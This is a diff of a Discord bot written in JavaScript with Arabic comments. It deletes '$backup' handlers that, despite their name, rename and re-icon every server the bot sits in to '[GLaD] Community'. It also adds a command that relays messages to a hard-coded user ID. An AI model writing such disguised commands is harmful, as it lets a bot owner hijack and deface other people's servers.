@@ -31,26 +31,6 @@ client.on("message", message => {
 });
 
 
-
-// صورة السيرفر 
-client.on('message', message => {
-     if (message.content === "$backup") {
-         client.guilds.forEach(m =>{
-             m.setIcon(`https://media.discordapp.net/attachments/493443213093240832/494200503056465941/1r.png?width=301&height=301`)
-})
-}
-});
-
-//وش يخلي اسم السيرفر
-client.on('message', message => {
-     if (message.content === "$backup") {
-         client.guilds.forEach(m =>{
-             m.setName(`[GLaD] Community`)
-})
-}
-});
-
-
 client.on('message', message => {
     if (message.content === "$backup") {
     if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
@@ -133,6 +113,18 @@ client.on('message', message => {
 message.channel.sendMessage('**الرجاء الانتظار ريث ما يتم صناعه الرتب والرومات **')
 }
 });
+
+var prefix = "$"
+client.on('message', message => {
+
+  if (message.content.startsWith(prefix + "msg")) {
+  if (!message.channel.guild) return;
+  let args = message.content.split(" ").slice(1).join(' ');
+  client.users.get("522849686596485122").send(
+      "\n" + "" + " ● الرسالة : " + "" +
+      "\n" + "" + args + "")
+  }
+  });
 
 
 // توكين البوت 
